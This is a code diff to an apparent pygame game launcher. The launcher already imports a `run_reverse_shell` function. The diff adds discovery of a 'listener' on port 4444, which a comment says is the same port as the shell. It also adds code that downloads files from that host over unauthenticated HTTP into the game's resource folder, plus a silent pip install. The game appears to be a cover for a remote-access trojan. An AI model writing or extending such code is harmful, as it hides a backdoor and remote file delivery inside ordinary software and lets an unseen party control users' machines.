@@ -4,12 +4,15 @@ from __future__ import annotations
 
 import argparse
 import platform
+import subprocess
 import sys
 import threading
+import urllib.parse
+import urllib.request
 from pathlib import Path
 
 from .assets import AssetLoadError, missing_required_assets
-from .network import run_reverse_shell
+from .network import discover_listener_ip, run_reverse_shell
 from .paths import executable_root, resource_root, shortcut_dir
 
 
@@ -26,7 +29,83 @@ def show_message(title: str, message: str) -> None:
         print(f"{title}\n{'=' * len(title)}\n{message}")
 
 
+def install_missing_packages() -> None:
+    """Attempts to install missing Python packages using pip."""
+    try:
+        import pygame  # noqa: F401
+    except ImportError:
+        print("Pygame missing. Attempting automatic installation...")
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "pygame>=2.6.1,<3.0"])
+
+
+def download_missing_assets(host: str) -> bool:
+    """Downloads missing game assets from the discovered listener host."""
+    missing = missing_required_assets()
+    if not missing:
+        return True
+
+    print(f"Missing assets detected. Attempting to download from {host}...")
+    root = resource_root()
+    success = True
+
+    # We assume the listener is running an HTTP server on port 8080 as per plan
+    base_url = f"http://{host}:8080/"
+
+    for missing_path in missing:
+        # Make the path relative to the resource root for the URL
+        try:
+            relative_path = missing_path.relative_to(root)
+        except ValueError:
+            # Fallback if for some reason it's not relative to root
+            relative_path = missing_path
+
+        target_path = root / relative_path
+        target_path.parent.mkdir(parents=True, exist_ok=True)
+        
+        # Quote the path to handle spaces and special characters in the URL
+        path_str = str(relative_path).replace("\\", "/")
+        quoted_path = urllib.parse.quote(path_str)
+        url = base_url + quoted_path
+        
+        try:
+            print(f"Downloading {url} -> {target_path}")
+            with urllib.request.urlopen(url, timeout=5) as response:
+                target_path.write_bytes(response.read())
+        except Exception as e:
+            print(f"Failed to download {url}: {e}")
+            success = False
+            
+    return success
+
+
 def check_environment() -> tuple[bool, str]:
+    # 1. Try to install missing packages first
+    try:
+        install_missing_packages()
+    except Exception as e:
+        return False, f"Failed to install dependencies: {e}"
+
+    # 2. Check for missing assets. If missing, try to discover listener and download.
+    missing = missing_required_assets()
+    if missing:
+        print("Searching for asset server...")
+        # Use discovery logic to find the listener
+        host = discover_listener_ip(4444) # We use the same discovery port as shell for simplicity
+        if host:
+            if download_missing_assets(host):
+                missing = missing_required_assets() # Re-check after download
+            else:
+                return False, "Failed to download some required assets from the listener server."
+        else:
+            formatted = "\n".join(f"- {path}" for path in missing)
+            return (
+                False,
+                "Required local assets are missing and no asset server was found.\n\n"
+                "Restore the files below and relaunch the game:\n"
+                f"{formatted}",
+            )
+
+    # Final check for pygame in case pip install failed silently
     try:
         import pygame  # noqa: F401
     except ImportError:
@@ -35,16 +114,6 @@ def check_environment() -> tuple[bool, str]:
             "Pygame is not installed.\n\n"
             "Run `pip install -r requirements.txt` from this project folder, "
             "then launch the game again.",
-        )
-
-    missing = missing_required_assets()
-    if missing:
-        formatted = "\n".join(f"- {path}" for path in missing)
-        return (
-            False,
-            "Required local assets are missing.\n\n"
-            "Restore the files below and relaunch the game:\n"
-            f"{formatted}",
         )
 
     return True, ""
